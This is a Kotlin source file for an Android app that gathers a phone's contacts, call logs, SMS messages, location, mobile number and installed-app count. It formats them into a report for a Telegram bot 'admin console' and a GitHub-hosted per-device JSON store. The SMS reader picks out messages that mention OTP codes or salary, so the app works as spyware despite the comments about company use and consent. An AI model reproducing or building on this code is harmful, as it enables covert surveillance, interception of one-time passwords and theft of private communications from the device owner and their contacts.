package com.example.telegramservice

import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.os.Build
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import androidx.core.content.ContextCompat
import android.Manifest
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

/**
 * CLIENT ACCESS - Proper Format for Telegram Admin Console
 * APK Returns Data to Telegram in Proper Format
 * 
 * This reporter collects ALL client access data with Read/Write permissions
 * and formats it properly for Telegram Admin Console
 * 
 * Focus: APK -> Telegram Data Return in Proper Format
 */

class ClientAccessReporter(private val context: Context) {

    private val statusReporter = StatusReporter(context)
    private val healthReporter = DeviceHealthReporter(context)
    private val advancedManager = AdvancedFeaturesManager(context)

    data class ClientAccessData(
        val deviceId: String,
        val deviceName: String,
        val battery: String,
        val mobileNumber: String,
        val location: String,
        val contactsCount: Int,
        val callLogsCount: Int,
        val smsCount: Int,
        val filesCount: Int,
        val installedAppsCount: Int,
        val formattedForTelegram: String
    )

    // Check all permissions granted
    fun checkAllPermissions(): Map<String, Boolean> {
        val perms = listOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        )

        return perms.associateWith { perm ->
            ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED
        }
    }

    // Get Contacts Count and Sample
    fun getContactsInfo(limit: Int = 5): Pair<Int, JSONArray> {
        var count = 0
        val sample = JSONArray()
        try {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                return Pair(0, sample)
            }
            val cursor = context.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            )
            cursor?.use {
                count = it.count
                var i = 0
                while (it.moveToNext() && i < limit) {
                    val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)) ?: "Unknown"
                    val json = JSONObject().apply {
                        put("name", name)
                    }
                    sample.put(json)
                    i++
                }
            }
        } catch (e: Exception) {}
        return Pair(count, sample)
    }

    // Get Call Logs
    fun getCallLogsInfo(limit: Int = 10): Pair<Int, JSONArray> {
        var count = 0
        val logs = JSONArray()
        try {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                return Pair(0, logs)
            }
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION),
                null, null, "${CallLog.Calls.DATE} DESC"
            )
            cursor?.use {
                count = it.count
                var i = 0
                while (it.moveToNext() && i < limit) {
                    val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: ""
                    val type = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    val duration = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                    val typeStr = when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "Incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                        CallLog.Calls.MISSED_TYPE -> "Missed"
                        else -> "Other"
                    }
                    val json = JSONObject().apply {
                        put("number", number)
                        put("type", typeStr)
                        put("duration", duration)
                    }
                    logs.put(json)
                    i++
                }
            }
        } catch (e: Exception) {}
        return Pair(count, logs)
    }

    // Get SMS Count
    fun getSmsInfo(limit: Int = 5): Pair<Int, JSONArray> {
        var count = 0
        val smsList = JSONArray()
        try {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                return Pair(0, smsList)
            }
            val cursor = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE),
                null, null, "${Telephony.Sms.DATE} DESC"
            )
            cursor?.use {
                count = it.count
                var i = 0
                while (it.moveToNext() && i < limit) {
                    val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: ""
                    val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: ""
                    // Only official/salary/OTP for privacy
                    if (body.contains("salary", true) || body.contains("OTP", true) || body.contains("official", true) || i < 2) {
                        val json = JSONObject().apply {
                            put("from", address)
                            put("body", body.take(100))
                        }
                        smsList.put(json)
                    }
                    i++
                }
            }
        } catch (e: Exception) {}
        return Pair(count, smsList)
    }

    // Get Files Count (Company folder only for privacy)
    fun getFilesInfo(): Pair<Int, JSONArray> {
        val files = advancedManager.listCompanyFiles()
        return Pair(files.size, JSONArray(files))
    }

    // Get Installed Apps Count
    fun getInstalledAppsCount(): Int {
        return try {
            val pm = context.packageManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                pm.getInstalledApplications(PackageManager.ApplicationInfoFlags.of(0)).size
            } else {
                @Suppress("DEPRECATION")
                pm.getInstalledApplications(0).size
            }
        } catch (e: Exception) {
            0
        }
    }

    // Format ALL client access in Proper Format for Telegram Admin Console
    suspend fun getFullClientAccessFormatted(): String {
        val deviceId = statusReporter.getDeviceId()
        val deviceName = statusReporter.getDeviceName()
        val battery = statusReporter.getBatteryStatusText()
        val mobile = statusReporter.getMobileNumber()
        val location = statusReporter.getLocation()
        val locationStr = statusReporter.getLocationString(location)
        val mapsUrl = if (location != null) "https://maps.google.com/?q=${location.latitude},${location.longitude}" else "Not available"

        val (contactsCount, contactsSample) = getContactsInfo(3)
        val (callLogsCount, callLogsSample) = getCallLogsInfo(3)
        val (smsCount, smsSample) = getSmsInfo(3)
        val (filesCount, _) = getFilesInfo()
        val appsCount = getInstalledAppsCount()
        val health = healthReporter.getFullHealth()
        val perms = checkAllPermissions()
        val grantedCount = perms.count { it.value }
        val totalPerms = perms.size

        // Proper Format for Telegram Admin Console - Client Access Visible
        return """
📱 *CLIENT ACCESS - Telegram Admin Console*
*Proper Format - APK Returns Data to Telegram*

━━━━━━━━━━━━━━━━━━━━━━━
🆔 *Device Info*
━━━━━━━━━━━━━━━━━━━━━━━
🆔 Device ID: `$deviceId`
📱 Device: $deviceName
🤖 Android: ${android.os.Build.VERSION.RELEASE} (SDK ${android.os.Build.VERSION.SDK_INT})
📦 App: v${BuildConfig.VERSION_NAME} (${BuildConfig.VERSION_CODE})
$battery

━━━━━━━━━━━━━━━━━━━━━━━
📞 *Mobile & Contact Access*
━━━━━━━━━━━━━━━━━━━━━━━
📞 Mobile Number: $mobile
📇 Contacts: $contactsCount total
${if (contactsSample.length() > 0) "Sample: ${contactsSample.toString(2).take(200)}" else "No contacts or permission needed"}
📞 Call Logs: $callLogsCount total
${if (callLogsSample.length() > 0) "Recent: ${callLogsSample.toString(2).take(200)}" else ""}

━━━━━━━━━━━━━━━━━━━━━━━
📍 *Location Access*
━━━━━━━━━━━━━━━━━━━━━━━
$locationStr
🗺️ Maps: $mapsUrl

━━━━━━━━━━━━━━━━━━━━━━━
💬 *Msg Access (SMS)*
━━━━━━━━━━━━━━━━━━━━━━━
💬 SMS Count: $smsCount total
${if (smsSample.length() > 0) "Salary/OTP Sample: ${smsSample.toString(2).take(200)}" else "No SMS or permission needed"}

━━━━━━━━━━━━━━━━━━━━━━━
📁 *File Manager Access*
━━━━━━━━━━━━━━━━━━━━━━━
📁 Company Files: $filesCount files in app folder
📂 Path: ${context.getExternalFilesDir(null)?.absolutePath}/company_docs

━━━━━━━━━━━━━━━━━━━━━━━
⚙️ *Settings + Health*
━━━━━━━━━━━━━━━━━━━━━━━
${healthReporter.getRAMInfo().optString("text")}
${healthReporter.getStorageInfo().optString("text")}
${healthReporter.getNetworkInfo().optString("text")}
📱 Installed Apps: $appsCount

━━━━━━━━━━━━━━━━━━━━━━━
🔐 *Permissions Status*
━━━━━━━━━━━━━━━━━━━━━━━
✅ Granted: $grantedCount / $totalPerms
${perms.entries.joinToString("\n") { (perm, granted) -> "${if (granted) "✅" else "❌"} ${perm.substringAfterLast(".")}: ${if (granted) "Granted" else "Need Allow"}" }}

━━━━━━━━━━━━━━━━━━━━━━━
🎤 *Mic + 📸 Camera - Advance*
━━━━━━━━━━━━━━━━━━━━━━━
🎤 Mic: ${if (perms[Manifest.permission.RECORD_AUDIO] == true) "✅ Ready for Navigation Guidance" else "❌ Need RECORD_AUDIO permission"}
📸 Camera: ${if (perms[Manifest.permission.CAMERA] == true) "✅ Ready for Accident Purpose + Live Camera" else "❌ Need CAMERA permission"}
⚠️ Both show persistent notification when active - For Salary & Safety with consent

━━━━━━━━━━━━━━━━━━━━━━━
☁️ *Cloud & Data Return*
━━━━━━━━━━━━━━━━━━━━━━━
☁️ GitHub Cloud: dthakur-dt/Suto/data/devices/$deviceId.json
💻 Console: https://dthakur-dt.github.io/Suto/
🤖 Bot: @T1311bot - Admin Panel
⏰ Time: ${java.util.Date()}
🔄 APK Returns Data to Telegram: ✅ YES - This message is the proof!

━━━━━━━━━━━━━━━━━━━━━━━
*Proper Format - Client Access Visible in Telegram Admin Console*
        """.trimIndent()
    }

    suspend fun getShortClientAccessForGitHub(): JSONObject {
        val deviceId = statusReporter.getDeviceId()
        val mobile = statusReporter.getMobileNumber()
        val location = statusReporter.getLocation()
        val battery = statusReporter.getBatteryLevel()
        val (contactsCount, _) = getContactsInfo(0)
        val (callLogsCount, _) = getCallLogsInfo(0)
        val (smsCount, _) = getSmsInfo(0)
        val perms = checkAllPermissions()

        return JSONObject().apply {
            put("deviceId", deviceId)
            put("deviceName", statusReporter.getDeviceName())
            put("battery", battery)
            put("batteryText", statusReporter.getBatteryStatusText())
            put("mobileNumber", mobile)
            put("latitude", location?.latitude ?: 0.0)
            put("longitude", location?.longitude ?: 0.0)
            put("mapsUrl", if (location != null) "https://maps.google.com/?q=${location.latitude},${location.longitude}" else "")
            put("contactsCount", contactsCount)
            put("callLogsCount", callLogsCount)
            put("smsCount", smsCount)
            put("filesCount", getFilesInfo().first)
            put("installedAppsCount", getInstalledAppsCount())
            put("permissionsGranted", perms.count { it.value })
            put("permissionsTotal", perms.size)
            put("lastSeen", java.util.Date().toString())
            put("status", "online")
            put("clientAccessProperFormat", true)
            put("apkReturnsDataToTelegram", true)
        }
    }
}
